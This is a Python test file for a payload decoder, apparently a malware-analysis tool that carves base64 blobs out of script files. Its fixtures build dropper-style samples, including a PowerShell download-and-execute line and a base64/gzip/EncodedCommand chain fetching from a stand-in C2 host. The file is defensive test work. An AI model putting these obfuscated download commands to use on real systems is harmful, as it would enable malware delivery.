"""Embedded-payload carving: recover encoded regions from inside host files.

Titan's decoders are whole-buffer transforms, so before carving existed a
payload only decoded when the artifact *was* the encoded blob. A base64 blob
assigned to a JavaScript variable -- the ordinary shape of a real dropper --
decoded to nothing, and the chain stopped at the host file.

These tests pin both directions: the chain must unwind through a host, and
speculative carving must not manufacture artifacts from benign content.
"""

import base64
import gzip
import os

from titan_decoder.config import Config
from titan_decoder.core.analyzers.carving import EmbeddedPayloadAnalyzer
from titan_decoder.core.engine import TitanEngine


def _engine(**overrides):
    cfg = Config()
    cfg.set("max_recursion_depth", 8)
    for key, value in overrides.items():
        cfg.set(key, value)
    return TitanEngine(cfg)


def _host_with_blob(payload: bytes, prefix: str = "var blob = '") -> bytes:
    return (prefix + base64.b64encode(payload).decode() + "';\n").encode()


def test_blob_embedded_in_script_is_carved():
    payload = b"IEX (New-Object Net.WebClient).DownloadString('x')"
    host = _host_with_blob(payload)
    payloads = EmbeddedPayloadAnalyzer().carve(host)
    assert len(payloads) == 1
    assert payloads[0].encoding == "base64"
    assert payloads[0].data == payload
    # The offset must point at the blob inside the host, not at the host start.
    assert payloads[0].offset == host.index(base64.b64encode(payload))


def test_full_chain_unwinds_through_a_host_file():
    # base64(gzip(powershell -EncodedCommand ...)) embedded in a JS dropper:
    # every layer is one a whole-buffer decoder handles, but only after the
    # blob has been carved out of the host.
    command = (
        "powershell.exe -NoP -EncodedCommand "
        + base64.b64encode(
            "$c=New-Object Net.WebClient;$c.DownloadFile('http://carve.c2.test/a')".encode(
                "utf-16le"
            )
        ).decode()
    )
    host = _host_with_blob(gzip.compress(command.encode(), mtime=0))

    report = _engine().run_analysis(host)

    assert "http://carve.c2.test/a" in report["iocs"].get("urls", [])
    methods = [node["method"] for node in report["nodes"]]
    assert any(method.startswith("DECODE_Gzip") for method in methods)


def test_carved_node_records_producer_and_byte_offset():
    host = _host_with_blob(b"#!/bin/sh\necho carved provenance\n")
    report = _engine().run_analysis(host)

    carved = [
        node
        for node in report["nodes"]
        if (node.get("provenance") or {}).get("origin") == "carve"
    ]
    assert carved, "expected at least one carved node"
    provenance = carved[0]["provenance"]
    assert provenance["produced_by"] == "EmbeddedPayload"
    assert provenance["source_offset"] == host.index(b"IyEvYmlu")
    assert "at offset 0x" in provenance["reason"]


def test_host_is_still_analyzed_as_its_own_format():
    # Carving composes: it must not consume the analyzer slot that the script
    # analyzer needs, or a carved host silently loses its own analysis.
    host = b"var s = WScript.CreateObject('WScript.Shell');\n" + _host_with_blob(
        b"#!/bin/sh\necho payload\n"
    )
    report = _engine().run_analysis(host)
    assert report["nodes"][0]["method"] == "ANALYZE_Script"
    assert any(
        (node.get("provenance") or {}).get("origin") == "carve"
        for node in report["nodes"]
    )


def test_whole_buffer_blob_is_left_to_the_decoders():
    # When the artifact *is* the blob, the existing decoders already own it;
    # carving it one node earlier would only duplicate the graph.
    assert (
        EmbeddedPayloadAnalyzer().carve(base64.b64encode(b"#!/bin/sh\necho hi\n")) == []
    )


def test_benign_prose_is_not_carved():
    prose = (
        b"The quarterly report describes configuration management and "
        b"deployment practices across the organization without any payload.\n"
    )
    assert EmbeddedPayloadAnalyzer().carve(prose) == []


def test_random_noise_blob_is_declined():
    # A base64 run whose output is high-entropy noise must not become an
    # artifact: decoding successfully is not the same as decoding to something.
    noise = bytes((index * 97 + 13) % 256 for index in range(64))
    assert EmbeddedPayloadAnalyzer().carve(_host_with_blob(noise)) == []


def test_carving_does_not_fabricate_artifacts_from_random_hosts():
    analyzer = EmbeddedPayloadAnalyzer()
    fabricated = 0
    for _ in range(100):
        fabricated += len(analyzer.carve(os.urandom(4096)))
    assert fabricated == 0


def test_carving_is_deterministic_and_offset_ordered():
    host = (
        b"a = '"
        + base64.b64encode(b"#!/bin/sh\nfirst payload here\n")
        + b"'\nb = '"
        + base64.b64encode(b"#!/bin/sh\nsecond payload here\n")
        + b"'\n"
    )
    analyzer = EmbeddedPayloadAnalyzer()
    first = analyzer.carve(host)
    assert [p.offset for p in first] == sorted(p.offset for p in first)
    assert [(p.name, p.data) for p in first] == [
        (p.name, p.data) for p in analyzer.carve(host)
    ]


def test_artifact_count_is_bounded():
    blob = base64.b64encode(b"#!/bin/sh\necho bounded payload body\n").decode()
    host = "".join(f"v{index} = '{blob}{index:04d}';\n" for index in range(40)).encode()
    analyzer = EmbeddedPayloadAnalyzer({"max_carved_artifacts": 3})
    assert len(analyzer.carve(host)) <= 3


def test_oversized_carved_artifact_is_rejected():
    payload = b"#!/bin/sh\n" + b"A" * 4096
    analyzer = EmbeddedPayloadAnalyzer({"max_carved_artifact_size": 128})
    assert analyzer.carve(_host_with_blob(payload)) == []


def test_scan_window_is_bounded():
    host = b"# padding\n" * 2000 + _host_with_blob(b"#!/bin/sh\necho late\n")
    assert EmbeddedPayloadAnalyzer({"max_carve_scan_bytes": 512}).carve(host) == []
    assert EmbeddedPayloadAnalyzer().carve(host)


def test_carving_can_be_disabled():
    host = _host_with_blob(b"#!/bin/sh\necho disabled\n")
    cfg = Config()
    analyzers = dict(cfg.get("analyzers", {}))
    analyzers["embedded_payload"] = False
    cfg.set("analyzers", analyzers)
    report = TitanEngine(cfg).run_analysis(host)
    assert not any(
        (node.get("provenance") or {}).get("origin") == "carve"
        for node in report["nodes"]
    )
